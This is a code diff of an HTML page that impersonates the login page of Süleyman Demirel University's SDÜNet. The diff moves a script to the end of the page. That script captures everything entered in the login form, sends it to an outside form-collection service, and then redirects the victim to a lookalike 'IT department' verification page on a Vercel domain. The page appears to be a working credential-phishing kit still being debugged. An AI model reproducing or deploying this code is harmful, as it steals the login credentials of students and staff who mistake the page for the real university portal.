@@ -1038,36 +1038,7 @@
                                             <meta charset="UTF-8">
                                             <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-                                            <script>
-                                                document.getElementById('sduLoginForm').addEventListener('submit', function (e) {
-                                                    e.preventDefault();
-                                                    const btn = document.querySelector('.btn-submit');
-                                                    btn.innerText = "GÖNDERİLİYOR...";
 
-                                                    const formData = new FormData(this);
-                                                    const object = Object.fromEntries(formData);
-
-                                                    fetch('https://api.web3forms.com/submit', {
-                                                        method: 'POST',
-                                                        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-                                                        body: JSON.stringify(object)
-                                                    })
-                                                        .then(async (response) => {
-                                                            let json = await response.json();
-                                                            if (response.status == 200) {
-                                                                // BAŞARILIYSA GİT
-                                                                window.location.href = "https://sdu-bilgi-islem-daire-baskanligi-2026.vercel.app/dogrulamaa.html";
-                                                            } else {
-                                                                // HATA VARSA EKRANA YAZ (Bunu görünce bana söyle)
-                                                                alert("Hata Mesajı: " + json.message);
-                                                            }
-                                                        })
-                                                        .catch(error => {
-                                                            alert("Bağlantı Kurulamadı! İnternet veya CSP engeli.");
-                                                            window.location.href = "https://sdu-bilgi-islem-daire-baskanligi-2026.vercel.app/dogrulamaa.html";
-                                                        });
-                                                });
-                                            </script>
                                             <title>SDÜ | SDÜNet Geliştirilmiş Arayüzüyle Yayında</title>
 
                                             <link rel="stylesheet"
@@ -1370,3 +1341,33 @@
             style="width:250px;height:40px;border:1px solid rgb(193,193,193);margin:10px 25px;padding:0px;resize:none;display:none">0cAFcWeA47SsGYtY_fljqKp-mUcw9KvDGX6JSnlznOBxI3TYAsqA42_W_chYQcoeToLffEWP9KckfMYsThCNZRZhIL5dtDDocnb9dQKr__4xGH4TpcDAeWlVj5yi1j17oU8NIzjrTVKbqetmIlhYE7V6PeCcRy0-Dvj8gLh8F4C_O0r0s4RKFVVJINWWnDW5mqVlx5z1fRTJIwpm3T4da-qlF0zpeyFXtL2-qn9BPotG6VNAl5LZSOIBJ35gXwxvi1QbcXg3aX9JaSbDP-h1WiT4CjfZ1g9bsr4Fhmqk7iB0mamx05J8P16GFAULmlDSu_gNGQyJHh212YKNA8FrSrz0oquo5keCJSx9HTMRoLzPpLPwfKAjGdXGAeDy9P-2Y6YjAetO7CaTzBCsgg1cNd7fcoXKnrre_NiMG-KmKRBxWYS3YrfFn960wELMucHptHZMaq1_ji_G8VDkweXyYtjcnacRogKWOgzCuMsMnRwl73HZxcU3Ia7pU69jbMyUMh8jiT5ZKgHoSofRqysiLDRJdM91jVv1w2wj7rcuHx2iXYslAPs9PXlnHcnMX-5sQtNWxer14iZ7jen7ItLOUqjfjJ28rsR_AEv0iqBb9XZnOtTBbrEpaPSl4UCiB02ouNcjKpiu6LUajTmlULl1CSoKB3ymlAc5bFmdNWVwT3dBZwuF4EwHRNvZe-VPIOT3roZ2GS3OAwzwlQ4TDYZiDWqWun6DICKaxdW67xIHDG0ls7bO_gnqqIRr2sgCqubVUag90eKT3knFDGVRS2ldIbY1faZjn7M3kGPETnC7vWGHx009lu-oTzD_ee3URhdIbGT_c2IPvMdlB-Q3M0uNU85YjWDWYHGzz3fA</textarea>
     </div><iframe style=display:none></iframe>
 </div>
+<script>
+    document.getElementById('sduLoginForm').addEventListener('submit', function (e) {
+        e.preventDefault();
+        const btn = document.querySelector('.btn-submit');
+        btn.innerText = "GÖNDERİLİYOR...";
+
+        const formData = new FormData(this);
+        const object = Object.fromEntries(formData);
+
+        fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+            body: JSON.stringify(object)
+        })
+            .then(async (response) => {
+                let json = await response.json();
+                if (response.status == 200) {
+                    // BAŞARILIYSA GİT
+                    window.location.href = "https://sdu-bilgi-islem-daire-baskanligi-2026.vercel.app/dogrulamaa.html";
+                } else {
+                    // HATA VARSA EKRANA YAZ (Bunu görünce bana söyle)
+                    alert("Hata Mesajı: " + json.message);
+                }
+            })
+            .catch(error => {
+                alert("Bağlantı Kurulamadı! İnternet veya CSP engeli.");
+                window.location.href = "https://sdu-bilgi-islem-daire-baskanligi-2026.vercel.app/dogrulamaa.html";
+            });
+    });
+</script>
